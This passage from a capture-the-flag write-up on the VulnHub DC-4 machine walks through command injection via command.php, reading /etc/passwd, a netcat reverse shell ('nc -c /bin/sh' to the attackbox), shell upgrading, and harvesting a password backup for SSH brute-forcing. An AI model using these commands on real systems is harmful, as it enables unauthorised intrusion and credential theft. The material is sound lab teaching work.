/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-reponse.png?size=large 2x" sizes=auto data-title="zaproxy - fuzzer message results in success!" data-alt="zaproxy - fuzzer message results in success!" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - fuzzer message results in success!</figcaption></figure></p><p>The successful login happened during a 302 code but the continual 200 codes after indicate something significant occurred. By looking into the first 200 code, following the last 302, its message indicates we&rsquo;re already logged in but the last 302 is what contains the successful login attempt.</p><p><strong>The point here is to check the message contents for indicators of success and only use code or byte values as a guide when sifting through results.</strong></p><hr><hr><h2 id=abusing-the-system-tools-toolbox>Abusing the &ldquo;System Tools&rdquo; toolbox</h2><p>We have found working credentials!</p><p>First task is to login and see if we can access the <code>command.php</code> site we found earlier.</p><h3 id=probing-commandphp>Probing command.php</h3><p>Let&rsquo;s begin with logging in via /index.php using <code>admin:happy</code> credentials.<br>Success!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds.png?size=small" data-sub-html="<h2>webserver - attempting login</h2><p>webserver - attempting login</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds.png?size=large 2x" sizes=auto data-title="webserver - attempting login" data-alt="webserver - attempting login" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - attempting login</figcaption></figure></p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds-success.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds-success.png?size=small" data-sub-html="<h2>webserver - login success!</h2><p>webserver - login success!</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds-success.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds-success.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds-success.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-login-creds-success.png?size=large 2x" sizes=auto data-title="webserver - login success!" data-alt="webserver - login success!" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - login success!</figcaption></figure></p><p>Now that we&rsquo;re logged in, we see a &ldquo;Command&rdquo; hyperlink leading to the <code>command.php</code> site!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-site.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-site.png?size=small" data-sub-html="<h2>webserver - accessing command.php</h2><p>webserver - accessing command.php</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-site.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-site.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-site.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-site.png?size=large 2x" sizes=auto data-title="webserver - accessing command.php" data-alt="webserver - accessing command.php" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - accessing command.php</figcaption></figure></p><p>If we select the radio button labeled &ldquo;List Files&rdquo; and then click &ldquo;Run&rdquo;, we can see that the webpage responds with the output results of the <code>ls</code> cli command listing a directory from the webserver!<br>If we&rsquo;re able to change the values of any radio button, we will have code injection(CI) on the server!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-ls-execution.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-ls-execution.png?size=small" data-sub-html="<h2>webserver - checking out command.php</h2><p>webserver - checking out command.php</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-ls-execution.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-ls-execution.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-ls-execution.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-ls-execution.png?size=large 2x" sizes=auto data-title="webserver - checking out command.php" data-alt="webserver - checking out command.php" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - checking out command.php</figcaption></figure></p><h3 id=abusing-commandphp-for-code-injection>Abusing command.php for code injection</h3><p>Well enough fun in the web browser&mldr;</p><p>Let&rsquo;s (re)open <code>zaproxy</code> and see what&rsquo;s actually going on with the server messages. If we&rsquo;re lucky, we&rsquo;ll be able to change the values of a radio button without the server knowing any better. This is a result of not properly coding command.php and allowing user input to pass.</p><p>Upon running the &ldquo;List Files&rdquo; command and intercepting within <code>zaproxy</code>, we can see that the CLI commands are indeed being passed to the server!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-zaproxy-eval.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-zaproxy-eval.png?size=small" data-sub-html="<h2>webserver - command.php request</h2><p>webserver - command.php request</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-zaproxy-eval.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-zaproxy-eval.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-zaproxy-eval.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-zaproxy-eval.png?size=large 2x" sizes=auto data-title="webserver - command.php request" data-alt="webserver - command.php request" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - command.php request</figcaption></figure></p><p>Let&rsquo;s go ahead and send this request message over to &ldquo;Requester&rdquo;.<br>&ldquo;Requester&rdquo; is burpsuite&rsquo;s &ldquo;Repeater&rdquo;. It allows you to send a custom message over and over at will.</p><ol><li>With the previous request message opened, click on the toolbar menu &ldquo;Tools&rdquo; then &ldquo;Open message in requester tab&mldr;&rdquo;.<br>You should land on the requester tab with the previous request message opened inside.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-requester.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-requester.png?size=small" data-sub-html="<h2>webserver - zaproxy requester</h2><p>webserver - zaproxy requester</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-requester.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-requester.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-requester.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-requester.png?size=large 2x" sizes=auto data-title="webserver - zaproxy requester" data-alt="webserver - zaproxy requester" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - zaproxy requester</figcaption></figure></p><ol start=2><li>Lets change the radio button&rsquo;s value from <code>ls+-l</code> to <code>pwd</code>, then click &ldquo;Send&rdquo;.<br>You&rsquo;ll see the server response on the bottom right. Scroll down and you should see <code>/usr/share/nginx/html</code>.<br>We have code injection!</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-code-injection.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-code-injection.png?size=small" data-sub-html="<h2>webserver - zaproxy confirmed CI</h2><p>webserver - zaproxy confirmed CI</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-code-injection.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-command-code-injection.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-code-injection.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-command-code-injection.png?size=large 2x" sizes=auto data-title="webserver - zaproxy confirmed CI" data-alt="webserver - zaproxy confirmed CI" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - zaproxy confirmed CI</figcaption></figure></p><ol start=3><li>Upon running <code>cat /etc/passwd</code>, I found the following users:<br><code>charles</code><br><code>jim</code><br><code>sam</code></li></ol><p>I then run <code>whoami</code> to find out what user the webserver is running under and it&rsquo;s <code>www-data</code>. Since <code>www-data</code> isn&rsquo;t listed as a 1000+ user, they&rsquo;re not a user we can login as. We&rsquo;ll have to get access through this CI method, which is fine as it should be pretty straight forward.</p><h3 id=gaining-a-shell-as-www-data>Gaining a shell as www-data</h3><p>Before we run a netcat(nc) command to land a reverse shell, let&rsquo;s make sure the binary exists on the target host by injecting:<br><code>type nc</code></p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-find-nc.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-find-nc.png?size=small" data-sub-html="<h2>webserver - search for nc binary</h2><p>webserver - search for nc binary</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-find-nc.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-find-nc.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-find-nc.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-find-nc.png?size=large 2x" sizes=auto data-title="webserver - search for nc binary" data-alt="webserver - search for nc binary" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - search for nc binary</figcaption></figure></p><p>The target has the <code>nc</code> binary in the <code>/bin/</code> directory but do we have execution privileges? Inject the following:<br><code>ls -l /bin/nc</code></p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-nc-privs.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-nc-privs.png?size=small" data-sub-html="<h2>webserver - privilege confirmed to nc binary</h2><p>webserver - privilege confirmed to nc binary</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-nc-privs.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-nc-privs.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-nc-privs.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-nc-privs.png?size=large 2x" sizes=auto data-title="webserver - privilege confirmed to nc binary" data-alt="webserver - privilege confirmed to nc binary" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - privilege confirmed to nc binary</figcaption></figure></p><p>We do have execution privileges as <code>www-data</code> and since our attackbox resides on the same subnet as DC-4, we can simply do the following to land a reverse shell:</p><ol><li>Open a new terminal on the attackbox and start a <code>nc</code> listener:<br><code>nc -nvlp 10000</code></li></ol><ul><li><code>nc</code> - executes the nc binary on our attackbox</li><li><code>-n</code> - disables DNS</li><li><code>-v</code> - verbose mode</li><li><code>-l</code> - listen mode</li><li><code>-p</code> - let&rsquo;s us specify the port to listen on</li><li><code>10000</code> - port 10000 we&rsquo;ll listen on</li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-revshell-listener.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-revshell-listener.png?size=small" data-sub-html="<h2>webserver - setup nc listener</h2><p>webserver - setup nc listener</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-revshell-listener.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-revshell-listener.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-revshell-listener.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-revshell-listener.png?size=large 2x" sizes=auto data-title="webserver - setup nc listener" data-alt="webserver - setup nc listener" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - setup nc listener</figcaption></figure></p><ol start=2><li>Prep the following code into the radio button&rsquo;s value:<br><code>nc -c /bin/sh 192.168.0.1 10000</code></li></ol><ul><li><code>nc</code> - executes the nc binary</li><li><code>-c</code> - tells nc to execute a shell command</li><li><code>/bin/sh</code> - shell command to execute, in this case&mldr; open a shell</li><li><code>192.168.0.1</code> - IP of my attackbox, where a <code>nc</code> listener is ready on port 10000</li><li><code>10000</code> - the attackbox port to connect to</li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-zaproxy-revshell.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-zaproxy-revshell.png?size=small" data-sub-html="<h2>webserver - zaproxy code injection to revshell</h2><p>webserver - zaproxy code injection to revshell</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-zaproxy-revshell.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-zaproxy-revshell.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-zaproxy-revshell.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-zaproxy-revshell.png?size=large 2x" sizes=auto data-title="webserver - zaproxy code injection to revshell" data-alt="webserver - zaproxy code injection to revshell" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - zaproxy code injection to revshell</figcaption></figure></p><ol start=3><li>With the listener running and the code injection ready, click &ldquo;Send&rdquo; in zaproxy and watch our listener connect to DC-4&rsquo;s IP.<br>To confirm we&rsquo;re connected, which directory we&rsquo;re currently working out of, etc, I ran a few extra commands in the example below.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-established.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-established.png?size=small" data-sub-html="<h2>reverse shell established</h2><p>reverse shell established</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-established.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-established.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-established.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-established.png?size=large 2x" sizes=auto data-title="reverse shell established" data-alt="reverse shell established" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>reverse shell established</figcaption></figure></p><p><strong>NOTE: When it comes to reverse shells, you&rsquo;ll want to leave any process, associated with the reverse shell, alone. Disrupting the connection, by cancelling or exiting an associated program, could and probably will cause the reverse shell to disconnect.</strong></p><br><p>With a reverse shell established, we should look into upgrading it to a stable shell. We lack <code>tty</code> and hitting CTRL+C will cause the reverse shell to exit.</p><h3 id=upgrading-the-reverse-shell>Upgrading the reverse shell</h3><ol><li>Start by checking if <code>python</code> is present on DC-4:<br><code>which python</code></li></ol><ul><li><code>which</code> - searches directories listed in $PATH</li><li><code>python</code> - binary to search for</li></ul><ol start=2><li>With python present, next spawn a python shell:<br><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></li></ol><ul><li><code>python -c</code> - executes python binary with the command option</li><li><code>import pty;</code> - imports module &ldquo;pty&rdquo; then executes&mldr;</li><li><code>pty.spawn("/bin/bash")</code> - spawns a new bash process in the controlling terminal</li></ul><ol start=3><li><p>By habit I set $PATH, so we can reach binaries with ease but it wasn&rsquo;t needed as $PATH was already set.<br><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp</code></p></li><li><p>Set terminal output to have color:<br><code>export TERM=xterm-256color</code></p></li><li><p>Next let&rsquo;s set a environment variable, which is very helpful when enumerating files:<br><code>alias ll='ls -lsaht --color=auto'</code></p></li></ol><ul><li><code>alias ll</code> - alias name to set in the environment</li><li><code>ls -lsaht</code> - executes <code>ls</code> with options <code>-lsaht</code></li><li><code>--color=auto</code> - gives us color in the terminal output</li></ul><ol start=6><li><p>Background your shell with <code>nc</code> by keyboard shortcut:<br><code>CTRL+Z</code></p></li><li><p>Next we change the echo setting to disabled and reopen the foregrounded tty(Press enter twice!):<br><code>stty raw -echo;fg;reset</code></p></li></ol><ul><li><code>stty raw -echo</code> - disables our terminal echo meaning CTRL+C won&rsquo;t exit our reverse shell, autocomplete turns on, arrows will work, etc</li><li><code>fg;reset</code> - foregrounds the shell and reset provides us output again</li></ul><ol start=8><li>Set terminal columns and row maximums:<br><code>stty columns 200 rows 200</code></li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-python-shell.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-python-shell.png?size=small" data-sub-html="<h2>reverse shell - stable shell</h2><p>reverse shell - stable shell</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-python-shell.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-python-shell.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-python-shell.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/reverse-shell-python-shell.png?size=large 2x" sizes=auto data-title="reverse shell - stable shell" data-alt="reverse shell - stable shell" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>reverse shell - stable shell</figcaption></figure></p><p>Now with a stable reverse shell into DC-4, it&rsquo;s time to enumerate DC-4. In the real world, we&rsquo;d not only escalate within the ROE, but we&rsquo;d start collecting any sensitive data moving forward.</p><p><strong>Hacker mindset</strong><br>With a shell gained on DC-4, I&rsquo;m going to start enumeration with the previously found users, particularly the home folders of: <code>charles</code>, <code>jim</code>, and <code>sam</code>.</p><hr><hr><h2 id=enumerating-dc-4>Enumerating DC-4</h2><p>Enumerating a new system is usually done thoroughly, using many different manual techniques and automation tools. Gathering as you go is a tactic but depending on your time limit, ROE, the clients needs, etc you&rsquo;ll have to adjust accordingly.<br>Since we&rsquo;re dealing with a CTF, attacks are usually directed and unwanted data isn&rsquo;t usually present on the target.</p><h3 id=digging-into-user-home-folders>Digging into user home folders</h3><p>After digging around DC-4, user <code>jim</code> has some interesting files located in his home directory.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim.png?size=small" data-sub-html="<h2>enumerate DC-4 - jim&amp;rsquo;s home</h2><p>enumerate DC-4 - jim's home</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim.png?size=large 2x" sizes=auto data-title="enumerate DC-4 - jim's home" data-alt="enumerate DC-4 - jim&amp;rsquo;s home" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>enumerate DC-4 - jim&rsquo;s home</figcaption></figure></p><p>After digging around, I found a <code>old-passwords.bak</code> file located in <code>/home/jim/backup</code>. It looks to contain old passwords jim may have used?</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-passwords.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-passwords.png?size=small" data-sub-html="<h2>enumerate DC-4 - jim&amp;rsquo;s passwords</h2><p>enumerate DC-4 - jim's passwords</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-passwords.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-passwords.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-passwords.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-passwords.png?size=large 2x" sizes=auto data-title="enumerate DC-4 - jim's passwords" data-alt="enumerate DC-4 - jim&amp;rsquo;s passwords" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>enumerate DC-4 - jim&rsquo;s passwords</figcaption></figure></p><p>There&rsquo;s also a <code>mbox</code> file, which <code>www-data</code> lacks permission to open. This is something to notate and check out later if and when we get permissions to.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-mbox.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-mbox.png?size=small" data-sub-html="<h2>enumerate DC-4 - jim&amp;rsquo;s mbox file</h2><p>enumerate DC-4 - jim's mbox file</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-mbox.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-mbox.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-mbox.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/enum-user-jim-mbox.png?size=large 2x" sizes=auto data-title="enumerate DC-4 - jim's mbox file" data-alt="enumerate DC-4 - jim&amp;rsquo;s mbox file" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>enumerate DC-4 - jim&rsquo;s mbox file</figcaption></figure></p><p><strong>Hacker mindset</strong><br>Now that we have a list of passwords, I can try attacking two possible login paths: su or ssh.<br>I&rsquo;m going to attempt to automate login attempts on ssh using msfconsole&rsquo;s module: ssh-login.</p><hr><hr><h2 id=attacking-ssh>Attacking SSH</h2><p>With a list of clear text passwords residing in a directory under the user &ldquo;jim&rdquo;, we&rsquo;ll use that list to automate ssh logins. This will be done using Metasploit&rsquo;s &ldquo;ssh-login&rdquo; module.<br>Maybe jim is reusing old passwords or another user is using this password list?</p><h3 id=msfconsole-and-ssh-login>msfconsole and ssh-login</h3><p>First create two lists:</p><ol><li>contents of the &ldquo;old-passwords.bak&rdquo; file</li><li>list containing each possible user: jim, sam, charles, root<br><em>Both lists should use a one-per-line format</em></li></ol><p>Next load up metasploit by opening a new terminal and running <code>msfconsole</code>.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open.png?size=small" data-sub-html="<h2>msfconsole - open console</h2><p>msfconsole - open console</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open.png?size=large 2x" sizes=auto data-title="msfconsole - open console" data-alt="msfconsole - open console" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>msfconsole - open console</figcaption></figure></p><p>Once loaded and at the &ldquo;MSF&rdquo; terminal, search for ssh_login by running: <code>search ssh_login</code><br>Of the few results, select <code>ssh_login</code> but typing in <code>use #</code>, replacing <code>#</code> with the corresponding number of the result which does NOT include <code>_pubkey</code> in it&rsquo;s result.<br>Below, I enter <code>use 0</code>.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open-ssh_login.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open-ssh_login.png?size=small" data-sub-html="<h2>msfconsole - open ssh_login</h2><p>msfconsole - open ssh_login</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open-ssh_login.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open-ssh_login.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open-ssh_login.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-open-ssh_login.png?size=large 2x" sizes=auto data-title="msfconsole - open ssh_login" data-alt="msfconsole - open ssh_login" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>msfconsole - open 